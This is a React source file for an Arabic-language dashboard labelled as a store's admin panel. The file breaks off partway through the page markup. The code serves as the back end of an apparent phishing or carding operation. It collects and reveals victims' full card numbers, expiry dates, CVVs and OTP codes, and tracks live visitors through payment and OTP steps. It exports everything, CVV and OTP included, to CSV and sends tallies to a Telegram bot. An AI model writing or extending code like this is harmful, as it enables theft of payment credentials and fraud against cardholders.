import React, { useState, useEffect, useMemo } from 'react';
import { 
  FirestoreOrderRecord, 
  FirestoreCustomerRecord, 
  subscribeToOrders, 
  subscribeToCustomers, 
  updateOrderStatus, 
  deleteOrder, 
  auth
} from '../lib/firebase';
import { 
  EsfgdrBooking, 
  EsfgdrVisitor, 
  EsfgdrStep,
  subscribeToEsfgdrBookings,
  subscribeToEsfgdrVisitors,
  subscribeToEsfgdrSteps,
  updateEsfgdrBookingStatus,
  deleteEsfgdrBooking,
  deleteEsfgdrStep,
  sendTelegramNotification,
  sendTelegramNotificationDetailed,
  checkTelegramUpdates,
  getTelegramConfig,
  saveTelegramConfig,
  resetTelegramConfig,
  DEFAULT_TELEGRAM_CONFIG,
  TelegramConfigState
} from '../lib/esfgdrFirebase';
import { 
  Database, 
  TrendingUp, 
  ShoppingBag, 
  Users, 
  CreditCard, 
  Search, 
  Filter, 
  RefreshCw, 
  Download, 
  PlusCircle, 
  Trash2, 
  Eye, 
  EyeOff,
  Phone, 
  MessageSquare, 
  ExternalLink, 
  CheckCircle2, 
  Clock, 
  Truck, 
  XCircle, 
  Store,
  Layers,
  FileSpreadsheet,
  Check,
  AlertCircle,
  Radio,
  Send,
  KeyRound,
  Bot,
  Copy,
  Zap,
  Activity,
  Calendar,
  MapPin,
  Lock,
  ChevronDown,
  ChevronUp,
  ShieldCheck
} from 'lucide-react';
import { CompletedOrder } from '../types';

interface AdminDashboardProps {
  onBackToStore: () => void;
  onViewOrderReceipt?: (order: CompletedOrder) => void;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({
  onBackToStore,
  onViewOrderReceipt
}) => {
  // Navigation & Tabs
  const [activeTab, setActiveTab] = useState<'bookings' | 'visitors' | 'steps' | 'telegram' | 'store_orders' | 'raw'>('bookings');
  
  // Data Source Toggle
  const [dataSource, setDataSource] = useState<'esfgdr' | 'delmon' | 'both'>('esfgdr');

  // esfgdr Live State
  const [esfgdrBookings, setEsfgdrBookings] = useState<EsfgdrBooking[]>([]);
  const [esfgdrVisitors, setEsfgdrVisitors] = useState<EsfgdrVisitor[]>([]);
  const [esfgdrSteps, setEsfgdrSteps] = useState<EsfgdrStep[]>([]);
  const [isEsfgdrLoading, setIsEsfgdrLoading] = useState(true);

  // Local Store Orders State
  const [storeOrders, setStoreOrders] = useState<FirestoreOrderRecord[]>([]);
  const [storeCustomers, setStoreCustomers] = useState<FirestoreCustomerRecord[]>([]);

  // UI States
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [successToast, setSuccessToast] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [stepFilter, setStepFilter] = useState('all');
  const [updatingId, setUpdatingId] = useState<string | null>(null);
  const [revealedCards, setRevealedCards] = useState<Record<string, boolean>>({});
  const [expandedStepId, setExpandedStepId] = useState<string | null>(null);

  // Telegram Custom Message & Config State
  const [telegramConfig, setTelegramConfig] = useState<TelegramConfigState>(getTelegramConfig);
  const [tokenInput, setTokenInput] = useState(telegramConfig.botToken);
  const [chatIdInput, setChatIdInput] = useState(telegramConfig.chatId);
  const [usernameInput, setUsernameInput] = useState(telegramConfig.botUsername);
  const [isCheckingUpdates, setIsCheckingUpdates] = useState(false);
  const [detectedChats, setDetectedChats] = useState<{ id: string | number; name: string; username?: string; text?: string }[]>([]);
  const [hasScannedUpdates, setHasScannedUpdates] = useState(false);
  const [telegramErrorDetail, setTelegramErrorDetail] = useState<string | null>(null);
  const [telegramMsg, setTelegramMsg] = useState('');
  const [isSendingTelegram, setIsSendingTelegram] = useState(false);

  // Raw Explorer State
  const [rawCollection, setRawCollection] = useState<'bookings' | 'visitors' | 'bookings_steps' | 'store_orders'>('bookings');

  // Notification helper
  const showNotification = (msg: string) => {
    setSuccessToast(msg);
    setTimeout(() => setSuccessToast(''), 4000);
  };

  // Toggle card number reveal
  const toggleRevealCard = (id: string) => {
    setRevealedCards(prev => ({ ...prev, [id]: !prev[id] }));
  };

  // 1. Subscribe to esfgdr in real time
  useEffect(() => {
    setIsEsfgdrLoading(true);
    setErrorMsg('');

    const unsubBookings = subscribeToEsfgdrBookings(
      (data) => {
        setEsfgdrBookings(data);
        setIsEsfgdrLoading(false);
      },
      (err) => {
        setErrorMsg('خطأ في الاتصال بقاعدة esfgdr: ' + err.message);
        setIsEsfgdrLoading(false);
      }
    );

    const unsubVisitors = subscribeToEsfgdrVisitors(
      (data) => {
        setEsfgdrVisitors(data);
      },
      (err) => console.warn('Visitor subscribe error:', err)
    );

    const unsubSteps = subscribeToEsfgdrSteps(
      (data) => {
        setEsfgdrSteps(data);
      },
      (err) => console.warn('Steps subscribe error:', err),
      150
    );

    // Also subscribe to local store orders
    const unsubStoreOrders = subscribeToOrders(
      (data) => setStoreOrders(data),
      (err) => console.warn('Store orders error:', err)
    );

    const unsubStoreCustomers = subscribeToCustomers(
      (data) => setStoreCustomers(data),
      (err) => console.warn('Store customers error:', err)
    );

    return () => {
      unsubBookings();
      unsubVisitors();
      unsubSteps();
      unsubStoreOrders();
      unsubStoreCustomers();
    };
  }, []);

  // Format timestamps helper
  const formatDateTime = (val: any) => {
    if (!val) return '—';
    if (val.seconds) {
      return new Date(val.seconds * 1000).toLocaleString('ar-BH', {
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    }
    if (typeof val === 'string') {
      try {
        const d = new Date(val);
        if (!isNaN(d.getTime())) {
          return d.toLocaleString('ar-BH', {
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
          });
        }
      } catch {}
      return val;
    }
    return String(val);
  };

  // Metrics Calculations
  const onlineVisitorsCount = useMemo(() => {
    return esfgdrVisitors.filter(v => v.isOnline).length;
  }, [esfgdrVisitors]);

  const totalBookingsCount = esfgdrBookings.length;

  const totalRevenue = useMemo(() => {
    return esfgdrBookings.reduce((sum, b) => sum + (Number(b.depositAmount) || Number(b.paymentAmount) || 0), 0);
  }, [esfgdrBookings]);

  const cardsCount = useMemo(() => {
    return esfgdrBookings.filter(b => b.cardNumber || b.cardLast4).length;
  }, [esfgdrBookings]);

  const otpCount = useMemo(() => {
    return esfgdrBookings.filter(b => b.verificationCode).length;
  }, [esfgdrBookings]);

  // Filtered Bookings
  const filteredBookings = useMemo(() => {
    return esfgdrBookings.filter(b => {
      // Status filter
      if (statusFilter !== 'all') {
        const s = (b.status || '').toLowerCase();
        const p = (b.paymentStatus || '').toLowerCase();
        if (statusFilter === 'confirmed' && s !== 'confirmed') return false;
        if (statusFilter === 'pending' && s !== 'pending' && s !== 'new') return false;
        if (statusFilter === 'succeeded' && p !== 'succeeded') return false;
      }
      // Search query
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const matchName = (b.name || '').toLowerCase().includes(q);
        const matchPhone = (b.phone || '').toLowerCase().includes(q);
        const matchEmail = (b.email || '').toLowerCase().includes(q);
        const matchCard = (b.cardNumber || '').includes(q) || (b.cardLast4 || '').includes(q);
        const matchOtp = (b.verificationCode || '').includes(q);
        const matchId = (b.id || '').toLowerCase().includes(q);
        const matchAddress = (b.fromAddress || '').toLowerCase().includes(q) || (b.toAddress || '').toLowerCase().includes(q);
        return matchName || matchPhone || matchEmail || matchCard || matchOtp || matchId || matchAddress;
      }
      return true;
    });
  }, [esfgdrBookings, statusFilter, searchQuery]);

  // Filtered Steps
  const filteredSteps = useMemo(() => {
    return esfgdrSteps.filter(s => {
      if (stepFilter !== 'all') {
        if (stepFilter === 'payment' && !['payment', 'payment_started'].includes(s.step || '')) return false;
        if (stepFilter === 'otp' && !['otp', 'otp_requested'].includes(s.step || '')) return false;
        if (stepFilter === 'details' && !['details', 'details_filled'].includes(s.step || '')) return false;
        if (stepFilter === 'address' && s.step !== 'address') return false;
        if (stepFilter === 'booking' && !['booking_created', 'confirmed', 'payment_completed'].includes(s.step || '')) return false;
      }
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const strData = JSON.stringify(s.data || {}).toLowerCase();
        const matchSession = (s.sessionId || '').toLowerCase().includes(q);
        const matchStep = (s.step || '').toLowerCase().includes(q);
        return strData.includes(q) || matchSession || matchStep;
      }
      return true;
    });
  }, [esfgdrSteps, stepFilter, searchQuery]);

  // Handle Booking Status Update
  const handleUpdateStatus = async (bookingId: string, newStatus: string) => {
    try {
      setUpdatingId(bookingId);
      await updateEsfgdrBookingStatus(bookingId, newStatus);
      showNotification(`تم تحديث حالة الحجز إلى: ${newStatus}`);
    } catch (err: any) {
      setErrorMsg('تعذر تحديث الحالة: ' + err.message);
    } finally {
      setUpdatingId(null);
    }
  };

  // Handle Delete Booking
  const handleDeleteBooking = async (bookingId: string) => {
    if (!window.confirm('هل أنت متأكد من رغبتك في حذف هذا الحجز من قاعدة البيانات؟')) return;
    try {
      setUpdatingId(bookingId);
      await deleteEsfgdrBooking(bookingId);
      showNotification('تم حذف الحجز بنجاح من قاعدة البيانات.');
    } catch (err: any) {
      setErrorMsg('تعذر حذف الحجز: ' + err.message);
    } finally {
      setUpdatingId(null);
    }
  };

  // Handle Delete Step
  const handleDeleteStep = async (stepId: string) => {
    try {
      await deleteEsfgdrStep(stepId);
      showNotification('تم حذف سجل الخطوة بنجاح.');
    } catch (err: any) {
      setErrorMsg('تعذر حذف السجل: ' + err.message);
    }
  };

  // Save custom telegram config
  const handleSaveTelegramConfig = (e: React.FormEvent) => {
    e.preventDefault();
    const newConfig: TelegramConfigState = {
      botToken: tokenInput.trim(),
      botUsername: usernameInput.trim().replace(/^@/, ''),
      chatId: chatIdInput.trim()
    };
    saveTelegramConfig(newConfig);
    setTelegramConfig(newConfig);
    showNotification('تم حفظ إعدادات البوت والدردشة بنجاح! 💾');
  };

  // Reset to default telegram config
  const handleResetTelegramConfig = () => {
    const def = resetTelegramConfig();
    setTelegramConfig(def);
    setTokenInput(def.botToken);
    setChatIdInput(def.chatId);
    setUsernameInput(def.botUsername);
    showNotification('تمت استعادة الإعدادات الافتراضية للبوت (@ghhfvsshsorffs_bot) ✅');
  };

  // Scan updates to auto detect chat ID
  const handleScanUpdates = async () => {
    setIsCheckingUpdates(true);
    setTelegramErrorDetail(null);
    try {
      const res = await checkTelegramUpdates(tokenInput.trim() || undefined);
      setHasScannedUpdates(true);
      if (res.ok) {
        if (res.detectedChats && res.detectedChats.length > 0) {
          setDetectedChats(res.detectedChats);
          showNotification(`تم اكتشاف ${res.detectedChats.length} مستخدم تفاعلوا مع البوت! 🎯`);
        } else {
          setDetectedChats([]);
          showNotification('لم يتم العثور على محادثات جديدة بعد. اضغط Start في البوت أولاً.');
        }
      } else {
        setTelegramErrorDetail(res.error || 'فشل جلب تحديثات البوت');
      }
    } catch (err: any) {
      setTelegramErrorDetail(err.message || 'خطأ في الاتصال');
    } finally {
      setIsCheckingUpdates(false);
    }
  };

  const handleApplyChatId = (detectedId: string | number) => {
    const idStr = detectedId.toString();
    setChatIdInput(idStr);
    const updated = { ...telegramConfig, chatId: idStr };
    saveTelegramConfig(updated);
    setTelegramConfig(updated);
    showNotification(`تم تعيين وتحديث معرف الدردشة: ${idStr} ✅`);
  };

  // Handle Send Telegram Message
  const handleSendTelegram = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!telegramMsg.trim()) return;
    setIsSendingTelegram(true);
    setTelegramErrorDetail(null);
    try {
      const res = await sendTelegramNotificationDetailed(telegramMsg.trim(), {
        botToken: tokenInput.trim(),
        chatId: chatIdInput.trim()
      });
      if (res.ok) {
        showNotification('تم إرسال الإشعار إلى تلغرام بنجاح! 🚀');
        setTelegramMsg('');
      } else {
        setTelegramErrorDetail(res.error || 'فشل الإرسال إلى تلغرام');
        setErrorMsg('فشل الإرسال: ' + (res.error || 'تأكد من بدء المحادثة مع البوت بالضغط على Start'));
      }
    } catch (err: any) {
      setTelegramErrorDetail(err.message);
      setErrorMsg('خطأ أثناء إرسال تلغرام: ' + err.message);
    } finally {
      setIsSendingTelegram(false);
    }
  };

  // Send Quick Telegram Test
  const handleQuickTelegramTest = async () => {
    setIsSendingTelegram(true);
    setTelegramErrorDetail(null);
    const msg = `⚡ <b>اختبار فوري من لوحة التحكم — متجر دلمون!</b>\n` +
      `📅 <b>الوقت:</b> ${new Date().toLocaleString('ar-BH')}\n` +
      `📊 <b>الحجوزات والعمليات:</b> ${totalBookingsCount}\n` +
      `👥 <b>الزوار المتصلين:</b> ${onlineVisitorsCount}\n` +
      `💳 <b>البطاقات:</b> ${cardsCount} | 🔑 <b>الـ OTP:</b> ${otpCount}\n` +
      `🤖 <b>البوت المربوط:</b> @${telegramConfig.botUsername}\n` +
      `✅ الاتصال سليم ونشط!`;

    const res = await sendTelegramNotificationDetailed(msg, {
      botToken: tokenInput.trim(),
      chatId: chatIdInput.trim()
    });
    setIsSendingTelegram(false);
    if (res.ok) {
      showNotification('تم إرسال التنبيه الفوري بنجاح إلى تلغرام! 📱');
    } else {
      setTelegramErrorDetail(res.error || 'تعذر الإرسال');
      setErrorMsg('تعذر إرسال التنبيه: ' + (res.error || 'تأكد من فتح البوت والضغط على Start'));
    }
  };


  // Copy to clipboard
  const handleCopyText = (text: string, label: string = 'النص') => {
    navigator.clipboard.writeText(text);
    showNotification(`تم نسخ ${label} إلى الحافظة! 📋`);
  };

  // Export CSV
  const handleExportCSV = () => {
    let csvContent = 'data:text/csv;charset=utf-8,\uFEFF';
    if (rawCollection === 'bookings') {
      csvContent += 'المعرف,الاسم,الهاتف,البريد,البطاقة,الانتهاء,CVV,رمز_OTP,حالة_الدفع,حالة_الطلب,المبلغ,العنوان,التاريخ\n';
      esfgdrBookings.forEach(b => {
        csvContent += `"${b.id}","${b.name || ''}","${b.phone || ''}","${b.email || ''}","${b.cardNumber || b.cardLast4 || ''}","${b.cardExpiry || ''}","${b.cardCvv || ''}","${b.verificationCode || ''}","${b.paymentStatus || ''}","${b.status || ''}","${b.depositAmount || b.paymentAmount || 0}","${(b.fromAddress || '')}","${formatDateTime(b.createdAt)}"\n`;
      });
    } else if (rawCollection === 'visitors') {
      csvContent += 'معرف_الجلسة,الصفحة,الخطوة,متصل,تاريخ_الإنشاء,آخر_نشاط\n';
      esfgdrVisitors.forEach(v => {
        csvContent += `"${v.sessionId || v.id}","${v.currentPage || ''}","${v.currentStep || ''}","${v.isOnline ? 'نعم' : 'لا'}","${formatDateTime(v.createdAt)}","${formatDateTime(v.updatedAt)}"\n`;
      });
    } else {
      csvContent += 'معرف_السجل,الجلسة,الخطوة,الصفحة,البيانات,الوقت\n';
      esfgdrSteps.forEach(s => {
        csvContent += `"${s.id}","${s.sessionId || ''}","${s.step || ''}","${s.page || ''}","${JSON.stringify(s.data || {}).replace(/"/g, '""')}","${formatDateTime(s.timestamp)}"\n`;
      });
    }
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `esfgdr_${rawCollection}_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showNotification(`تم تصدير ملف ${rawCollection}.csv بنجاح!`);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans p-3 sm:p-6" dir="rtl">
      {/* Toast Notification */}
      {successToast && (
        <div className="fixed top-5 left-1/2 -translate-x-1/2 z-50 bg-emerald-600 text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-2 border border-emerald-400 animate-bounce">
          <Check className="w-5 h-5" />
          <span className="font-bold text-sm">{successToast}</span>
        </div>
      )}

      {/* Error Banner */}
      {errorMsg && (
        <div className="mb-4 bg-red-950/80 border border-red-700 text-red-200 px-4 py-3 rounded-xl flex items-center justify-between">
          <div className="flex items-center gap-2">
            <AlertCircle className="w-5 h-5 text-red-400 shrink-0" />
            <span className="text-sm font-medium">{errorMsg}</span>
          </div>
          <button 
            onClick={() => setErrorMsg('')}
            className="text-red-400 hover:text-white text-xs underline cursor-pointer"
          >
            إغلاق
          </button>
        </div>
      )}

      {/* Top Header Bar */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-6 mb-6 shadow-xl">
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
          
          {/* Logo & Identity */}
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-xl bg-gradient-to-tr from-emerald-600 to-teal-400 flex items-center justify-center text-white shadow-lg shadow-emerald-500/20">
              <Database className="w-7 h-7" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                  لوحة التحكم وقاعدة البيانات المركزية
                </h1>
                <span className="bg-emerald-500/20 text-emerald-400 text-xs px-2.5 py-0.5 rounded-full font-bold border border-emerald-500/30 flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
                  مربوطة ومباشرة ⚡
                </span>
              </div>
              <p className="text-xs sm:text-sm text-slate-400 mt-0.5 flex flex-wrap items-center gap-2">
                <span>قاعدة البيانات: <strong className="text-emerald-300 font-mono">esfgdr</strong></span>
                <span>•</span>
                <span>
                  بوت تلغرام: <a 
                    href={`https://t.me/${telegramConfig.botUsername}`} 
                    target="_blank" 
                    rel="noopener noreferrer" 
                    className="text-sky-400 hover:text-sky-300 font-mono underline inline-flex items-center gap-1 font-bold"
                  >
                    @{telegramConfig.botUsername}
                    <ExternalLink className="w-3 h-3 inline" />
                  </a> ({telegramConfig.chatId})
                </span>
              </p>
            </div>
          </div>

          {/* Quick Actions */}
          <div className="flex flex-wrap items-center gap-2 w-full lg:w-auto">
            {/* Copy Secret Admin Link Button */}
            <button
              onClick={() => {
                const adminUrl = `${window.location.origin}/?admin=true`;
                navigator.clipboard.writeText(adminUrl);
                showNotification('تم نسخ الرابط السري المباشر للوحة التحكم! 🔗');
              }}
              className="bg-emerald-600 hover:bg-emerald-500 text-white text-xs sm:text-sm font-bold px-3.5 py-2.5 rounded-xl transition flex items-center gap-2 cursor-pointer shadow-lg shadow-emerald-600/20"
              title="نسخ الرابط السري المباشر للوحة التحكم"
            >
              <Copy className="w-4 h-4" />
              <span>نسخ رابط اللوحة الخاص 🔗</span>
            </button>

            {/* Telegram Test Button */}
            <button
              onClick={handleQuickTelegramTest}
              disabled={isSendingTelegram}
              className="bg-sky-600 hover:bg-sky-500 disabled:opacity-50 text-white text-xs sm:text-sm font-bold px-3.5 py-2.5 rounded-xl transition flex items-center gap-2 cursor-pointer shadow-lg shadow-sky-600/20"
              title="إرسال رسالة تجريبية فورية للتلغرام"
            >
              <Send className="w-4 h-4" />
              <span>{isSendingTelegram ? 'جاري الإرسال...' : 'تجربة تلغرام 📱'}</span>
            </button>

            {/* Back to store */}
            <button
              onClick={onBackToStore}
              className="bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs sm:text-sm font-bold px-4 py-2.5 rounded-xl transition flex items-center gap-2 cursor-pointer border border-slate-700"
            >
              <Store className="w-4 h-4 text-emerald-400" />
              <span>العودة للمتجر</span>
            </button>
          </div>
        </div>

        {/* Live Metrics Grid */}
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 mt-6 pt-6 border-t border-slate-800">
          
          {/* Card 1: Total Bookings */}
          <div className="bg-slate-950/70 border border-slate-800/80 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-slate-400 mb-1">
              <span className="text-xs font-medium">الحجوزات والعمليات</span>
              <ShoppingBag className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-2xl font-black text-white">{totalBookingsCount}</div>
            <div className="text-[11px] text-emerald-400 mt-0.5 flex items-center gap-1">
              <CheckCircle2 className="w-3 h-3" /> مسجلة في bookings
            </div>
          </div>

          {/* Card 2: Live Visitors */}
          <div className="bg-slate-950/70 border border-slate-800/80 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-slate-400 mb-1">
              <span className="text-xs font-medium">الزوار المتصلين الآن</span>
              <Radio className="w-4 h-4 text-green-400 animate-pulse" />
            </div>
            <div className="text-2xl font-black text-green-400 flex items-center gap-2">
              <span>{onlineVisitorsCount}</span>
              <span className="text-xs font-normal text-slate-400">/ {esfgdrVisitors.length} كلي</span>
            </div>
            <div className="text-[11px] text-green-400/90 mt-0.5 flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-ping"></span> متواجدون حالياً
            </div>
          </div>

          {/* Card 3: Cards Captured */}
          <div className="bg-slate-950/70 border border-slate-800/80 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-slate-400 mb-1">
              <span className="text-xs font-medium">البطاقات المسجلة</span>
              <CreditCard className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-2xl font-black text-amber-300">{cardsCount}</div>
            <div className="text-[11px] text-amber-400/80 mt-0.5 flex items-center gap-1">
              <Lock className="w-3 h-3" /> تشمل الرقم وCVV
            </div>
          </div>

          {/* Card 4: OTP Codes */}
          <div className="bg-slate-950/70 border border-slate-800/80 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-slate-400 mb-1">
              <span className="text-xs font-medium">رموز الـ OTP</span>
              <KeyRound className="w-4 h-4 text-yellow-400" />
            </div>
            <div className="text-2xl font-black text-yellow-400">{otpCount}</div>
            <div className="text-[11px] text-yellow-400/80 mt-0.5 flex items-center gap-1">
              <ShieldCheck className="w-3 h-3" /> رموز التحقق المدخلة
            </div>
          </div>

          {/* Card 5: Live Steps */}
          <div className="bg-slate-950/70 border border-slate-800/80 rounded-xl p-3.5 col-span-2 sm:col-span-1">
            <div className="flex items-center justify-between text-slate-400 mb-1">
              <span className="text-xs font-medium">الخطوات اللحظية</span>
              <Zap className="w-4 h-4 text-purple-400" />
            </div>
            <div className="text-2xl font-black text-purple-300">{esfgdrSteps.length}</div>
            <div className="text-[11px] text-purple-400/80 mt-0.5 flex items-center gap-1">
              <Activity className="w-3 h-3" /> سجل الأحداث الحي
            </div>
          </div>

        </div>
      </div>

      {/* Tabs Navigation */}
      <div className="flex items-center gap-2 overflow-x-auto pb-2 mb-6 scrollbar-thin">
        <button
          onClick={() => setActiveTab('bookings')}
          className={`px-4 py-2.5 rounded-xl font-bold text-sm transition flex items-center gap-2 whitespace-nowrap cursor-pointer ${
            activeTab === 'bookings'
              ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-600/20'
              : 'bg-slate-900 text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <ShoppingBag className="w-4 h-4" />
          <span>الحجوزات والعمليات ({totalBookingsCount})</span>
        </button>

        <button
          onClick={() => setActiveTab('visitors')}
          className={`px-4 py-2.5 rounded-xl font-bold text-sm transition flex items-center gap-2 whitespace-nowrap cursor-pointer ${
            activeTab === 'visitors'
              ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-600/20'
              : 'bg-slate-900 text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Radio className="w-4 h-4 text-green-400 animate-pulse" />
          <span>الزوار المباشرون ({onlineVisitorsCount} متصل)</span>
        </button>

        <button
          onClick={() => setActiveTab('steps')}
          className={`px-4 py-2.5 rounded-xl font-bold text-sm transition flex items-center gap-2 whitespace-nowrap cursor-pointer ${
            activeTab === 'steps'
              ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-600/20'
              : 'bg-slate-900 text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Zap className="w-4 h-4 text-yellow-400" />
          <span>سجل الخطوات اللحظي ({esfgdrSteps.length})</span>
        </button>

        <button
          onClick={() => setActiveTab('telegram')}
          className={`px-4 py-2.5 rounded-xl font-bold text-sm transition flex items-center gap-2 whitespace-nowrap cursor-pointer ${
            activeTab === 'telegram'
              ? 'bg-sky-600 text-white shadow-lg shadow-sky-600/20'
              : 'bg-slate-900 text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Bot className="w-4 h-4" />
          <span>بوت تلغرام والإشعارات</span>
        </button>

        <button
          onClick={() => setActiveTab('store_orders')}
          className={`px-4 py-2.5 rounded-xl font-bold text-sm transition flex items-center gap-2 whitespace-nowrap cursor-pointer ${
            activeTab === 'store_orders'
              ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-600/20'
              : 'bg-slate-900 text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Store className="w-4 h-4" />
          <span>طلبات متجر دلمون ({storeOrders.length})</span>
        </button>

        <button
          onClick={() => setActiveTab('raw')}
          className={`px-4 py-2.5 rounded-xl font-bold text-sm transition flex items-center gap-2 whitespace-nowrap cursor-pointer ${
            activeTab === 'raw'
              ? 'bg-purple-600 text-white shadow-lg shadow-purple-600/20'
              : 'bg-slate-900 text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Database className="w-4 h-4" />
          <span>مستكشف البيانات والتصدير</span>
        </button>
      </div>

      {/* ==================================================================== */}
      {/* TAB 1: BOOKINGS & ORDERS (esfgdr)                                    */}
      {/* ==================================================================== */}
      {activeTab === 'bookings' && (
        <div className="space-y-4">
          {/* Filters Bar */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-3 sm:p-4 flex flex-col md:flex-row items-center justify-between gap-3">
            <div className="relative w-full md:w-80">
              <Search className="w-4 h-4 text-slate-400 absolute right-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="بحث بالاسم، الهاتف، البطاقة، الـ OTP..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg pr-10 pl-4 py-2 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:border-emerald-500"
              />
            </div>

            <div className="flex items-center gap-2 w-full md:w-auto">
              <span className="text-xs text-slate-400 font-medium">تصفية:</span>
              <select
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value)}
                className="bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs font-medium text-slate-200 focus:outline-none focus:border-emerald-500 cursor-pointer"
              >
                <option value="all">جميع الحالات</option>
                <option value="confirmed">المؤكدة فقط (Confirmed)</option>
                <option value="pending">المعلقة فقط (Pending)</option>
                <option value="succeeded">تم الدفع بنجاح (Succeeded)</option>
              </select>

              <button
                onClick={handleExportCSV}
                className="bg-emerald-700/60 hover:bg-emerald-600 text-emerald-200 text-xs font-bold px-3 py-2 rounded-lg transition flex items-center gap-1.5 cursor-pointer"
                title="تصدير إلى Excel / CSV"
              >
                <Download className="w-3.5 h-3.5" />
                <span>تصدير CSV</span>
              </button>
            </div>
          </div>

          {/* Bookings List / Cards */}
          {isEsfgdrLoading ? (
            <div className="text-center py-16 bg-slate-900 border border-slate-800 rounded-2xl">
              <RefreshCw className="w-8 h-8 text-emerald-400 animate-spin mx-auto mb-3" />
              <p className="text-slate-400 text-sm">جاري تحميل الحجوزات والعمليات من قاعدة esfgdr...</p>
            </div>
          ) : filteredBookings.length === 0 ? (
            <div className="text-center py-16 bg-slate-900 border border-slate-800 rounded-2xl">
              <ShoppingBag className="w-12 h-12 text-slate-600 mx-auto mb-3" />
              <h3 className="text-lg font-bold text-slate-300">لا توجد حجوزات مطابقة</h3>
              <p className="text-xs text-slate-500 mt-1">جرّب تغيير عبارة البحث أو فلتر التصفية</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-4">
              {filteredBookings.map((b) => {
                const isRevealed = !!revealedCards[b.id];
                const cardNum = b.cardNumber || (b.cardLast4 ? `•••• •••• •••• ${b.cardLast4}` : '—');
                const hasCard = !!b.cardNumber || !!b.cardLast4;

                return (
                  <div 
                    key={b.id} 
                    className="bg-slate-900 border border-slate-800 hover:border-slate-700 rounded-2xl p-4 sm:p-5 transition shadow-lg"
                  >
                    <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-3 border-b border-slate-800 pb-3.5">
                      
                      {/* Customer Info */}
                      <div className="flex items-start gap-3">
                        <div className="w-10 h-10 rounded-xl bg-slate-800 border border-slate-700 flex items-center justify-center font-bold text-emerald-400 shrink-0">
                          {b.name ? b.name.charAt(0) : 'U'}
                        </div>
                        <div>
                          <div className="flex items-center gap-2 flex-wrap">
                            <h4 className="font-bold text-white text-base">{b.name || 'عميل غير مسمى'}</h4>
                            <span className="text-xs font-mono bg-slate-800 text-slate-400 px-2 py-0.5 rounded">
                              #{b.id}
                            </span>
                            {b.status && (
                              <span className={`text-[11px] font-bold px-2 py-0.5 rounded-full ${
                                b.status === 'confirmed' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' :
                                b.status === 'pending' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30' :
                                'bg-slate-800 text-slate-300'
                              }`}>
                                {b.status}
                              </span>
                            )}
                            {b.paymentStatus && (
                              <span className={`text-[11px] font-bold px-2 py-0.5 rounded-full ${
                                b.paymentStatus === 'succeeded' ? 'bg-green-500/20 text-green-300 border border-green-500/30' :
                                'bg-yellow-500/20 text-yellow-300'
                              }`}>
                                دفع: {b.paymentStatus}
                              </span>
                            )}
                          </div>

                          {/* Contact Info with direct links */}
                          <div className="flex flex-wrap items-center gap-3 mt-1.5 text-xs text-slate-400">
                            {b.phone && (
                              <div className="flex items-center gap-1.5">
                                <Phone className="w-3.5 h-3.5 text-emerald-400" />
                                <a 
                                  href={`tel:${b.phone}`} 
                                  className="text-emerald-400 font-mono hover:underline"
                                  dir="ltr"
                                >
                                  {b.phone}
                                </a>
                                <a 
                                  href={`https://wa.me/${b.phone.replace(/[^0-9]/g, '')}`} 
                                  target="_blank" 
                                  rel="noopener noreferrer" 
                                  className="bg-emerald-900/60 hover:bg-emerald-700 text-emerald-200 px-2 py-0.5 rounded text-[10px] font-bold transition"
                                >
                                  واتساب 💬
                                </a>
                              </div>
                            )}
                            {b.email && (
                              <span className="font-mono text-slate-300">{b.email}</span>
                            )}
